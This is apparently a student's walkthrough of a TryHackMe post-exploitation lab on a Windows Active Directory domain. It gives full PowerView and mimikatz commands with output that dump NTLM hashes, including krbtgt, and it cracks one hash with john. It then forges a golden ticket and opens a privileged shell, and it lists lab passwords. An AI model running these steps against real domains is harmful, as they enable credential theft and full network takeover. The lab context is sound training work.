
see: [room](https://tryhackme.com/room/postexploit)

----
#### NOTE:

One thing to be kept in mind. In this room, _mimikatz.exe_, _powerview.ps1_, _sharphound.ps1_ are kept in **Download folder**, but ***no threat detection*** was notified.

I investigated it by going to: `Windows security > Virus & threat protection > Virus & threat protection settings`. Every ***protection type*** was set to `off mode`

`=> That's the reason why no ***threat notification*** was seen`
----

This room will cover all of the basics of post-exploitation:

1. We'll talk everything from _post-exploitation enumeration_ with ***powerview*** and ***bloodhound***, ***dumping hashes*** and ***golden ticket attacks*** with _mimikatz_
2. _Basic information gathering_ using ***windows server tools*** and ***logs***, and then we will wrap up this room talking about ***the basics of maintaining access with the persistence metaploit module*** and ***creating a backdoor into the machine to get an instant meterpreter shell*** if the system is _ever shutdown or reset_.

This room will be related to <ins>very real world applications</ins> and will most likely <ins>not</ins> help with any ctfs.


Task 2  Enumeration w/ Powerview
--------------------------------

<ins>Powerview Cheatsheet</ins>

1. [HarmJ0y gist](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
2. [Hackerinterview](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)


1. What is the shared folder that is not set by default?

1st method (with powerview options):
```
PS C:\Users\Administrator> Invoke-ShareFinder

\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
2nd method (without powerview only with cmd/powershell):

see: [hackingarticles](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

see the `Net view` portion of the within the link.

```
PS C:\Users\Administrator> net view \\10.10.180.99 /All
Shared resources at \\10.10.180.99


Share name  Type  Used as  Comment

-------------------------------------------------------------------------------  
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC            Remote IPC
NETLOGON    Disk           Logon server share
Share       Disk
SYSVOL      Disk           Logon server share
The command completed successfully.
```
:arrow_right: `Share`

2. What operating system is running inside of the network besides Windows Server 2019?

```
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem    

operatingsystem                  
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```

:arrow_right: `Windows 10 Enterprise Evaluation`

3. I've hidden a flag inside of the users find it

1st method (without powerview):
```
PS C:\Users\Administrator> net users POST

User name                    POST
Full Name                    POST{P0W3RV13W_FTW}
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/13/2020 8:42:38 PM
Password expires             Never
Password changeable          5/14/2020 8:42:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```
2nd method:
```
PS C:\Users\Administrator> Get-Netuser POST


logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=POST{P0W3RV13W_FTW},CN=Users,DC=CONTROLLER,DC=local   
objectclass           : {top, person, organizationalPerson, user}
displayname           : POST{P0W3RV13W_FTW}
name                  : POST{P0W3RV13W_FTW}
objectsid             : S-1-5-21-849420856-2351964222-986696166-1108
samaccountname        : POST
codepage              : 0
samaccounttype        : 805306368
whenchanged           : 5/14/2020 3:42:38 AM
accountexpires        : 9223372036854775807
countrycode           : 0
adspath               : LDAP://CN=POST{P0W3RV13W_FTW},CN=Users,DC=CONTROLLER,DC= 
                        local
instancetype          : 4
usncreated            : 12884
objectguid            : 090f9517-49d7-43f1-a051-9aaa5ed2088f
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=CONTROLLER,DC=lo 
                        cal
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : POST{P0W3RV13W_FTW}
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : POST{P0W3RV13W_FTW}
useraccountcontrol    : 66048
whencreated           : 5/14/2020 3:42:36 AM
primarygroupid        : 513
pwdlastset            : 5/13/2020 8:42:38 PM
usnchanged            : 12889

```
:arrow_right: `POST{P0W3RV13W_FTW}`


Task 3  Enumeration w/ Bloodhound
-----------------------------------

In my case: I have to `drag-n-drop` the zip file into `bloodhound GUI`


1. What service is also a domain admin

:arrow_right: `SQLSERVICE`

2. What two users are Kerberoastable?

:arrow_right: `SQLSERVICE, KRBTGT`

![](bloodhound.png?raw=true)


Task 4  Dumping hashes w/ mimikatz
-----------------------------------

1. `privilege::debug`
--> Ensures that the output is "Privilege '20' OK"
	- This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly.

2. `lsadump::lsa /patch`
-->  Dump those hashes!

In mimikatz (in windows):
```diff
PS C:\Users\Administrator\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )        
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/        


+ mimikatz # privilege::debug  	<--- Ensure that the output is "Privilege '20' OK" - _This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly_

Privilege '20' OK 
                  
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
                                                              
RID  : 000001f4 (500)                                         
User : Administrator                                          
LM   :                                                        
NTLM : 2777b7fec870e04dda00cd7260f7bee6                       
                                                              
RID  : 000001f5 (501)                                         
User : Guest                                                  
LM   :                                                        
NTLM :                                                        
                                                              
RID  : 000001f6 (502)                                         
User : krbtgt                           
LM   :                                  
NTLM : 5508500012cc005cf7082a9a89ebdfdf 
                                        
RID  : 0000044f (1103)                  
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b
 
RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : e733658bbffc4f044cc1e1b86d4fe31d

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a

```
1. what is the Machine1 Password?

```
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash_Machine1.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (?)
1g 0:00:00:00 DONE (2021-07-22 04:34) 7.692g/s 28061p/s 28061c/s 28061C/s girls..654123
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```
:arrow_right: `Password1`

2. What is the Machine2 Hash?

:arrow_right: `c39f2beb3d2ec06a62cb887fb391dee0`


Task5:  Golden Ticket Attacks w/ mimikatz
------------------------------------------

```
mimikatz # privilege::debug 
Privilege '20' OK 
                  
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
                                                              
RID  : 000001f6 (502)                                         
User : krbtgt                                                 
                                                              
 * Primary                                                    
    NTLM : 5508500012cc005cf7082a9a89ebdfdf                   
    LM   :                                                    
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf                 
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf                 
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c                 
                                                              
 * WDigest                                                    
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea                      
    02  7902703149b131c57e5253fd9ea710d0                      
    03  71288a6388fb28088a434d3705cc6f2a 
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea 
    05  7902703149b131c57e5253fd9ea710d0 
    06  df5ad3cc1ff643663d85dabc81432a81
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99 
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc6
4246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4
```

We got:

1. `Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166` :arrow_right: ***S-1-5-21-849420856-2351964222-986696166***

2. `User : krbtgt` :arrow_right: `krbtgt`

3. 
```
* Primary                                                    
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
```
:arrow_right: `5508500012cc005cf7082a9a89ebdfdf`

#### Now lets create a golden ticket:

Format:
```
kerberos::golden /user: /domain: /sid: /krbtgt: /id:<id of user>
```

```
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1
-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id
:500
 
User      : Administrator                                                      
Domain    : controller.local (CONTROLLER)                                      
SID       : S-1-5-21-849420856-2351964222-986696166                            
User Id   : 500                                                                
Groups Id : *513 512 520 518 519                                               
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt                     
Lifetime  : 7/21/2021 5:00:40 PM ; 7/19/2031 5:00:40 PM ; 7/19/2031 5:00:40 PM 
-> Ticket : ticket.kirbi                                                       
                                                                               
 * PAC generated                                                               
 * PAC signed                                                                  
 * EncTicketPart generated                                                     
 * EncTicketPart encrypted                                                     
 * KrbCred generated                                                           
                                                                               
Final Ticket Saved to file !
```

#### Use the Golden Ticket to access other machine:

1. `misc::cmd` - This will open a new command prompt with elevated privileges to all machines.

```
mimikatz # misc::cmd                                                           
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF63F6A43B8 
                                                                            
```
2. Access other Machines! - You will now have another command prompt with access to all other machines on the network

#### NOTE:
> Unfortunately because tryhackme does not currently support networks you will be unable to access other machines however I encourage you to add other machines to this domain controller yourself and try out these attacks.


Task6:  Enumeration w/ Server Manager
-------------------------------------

Please see the theory portion from [THM room](https://tryhackme.com/room/postexploit)


1. What tool allows to view the event logs ?

:arrow_right: `event viewer`

2. What is the SQL Service password

:arrow_right: `MYpassword123#`


Task7:  Maintaining Access
---------------------------


See from [room](https://tryhackme.com/room/postexploit)


Task8:  Conclusion
-------------------

Please do visit this room to addition links, All links will be present in bookmark though named Post Exploitation.


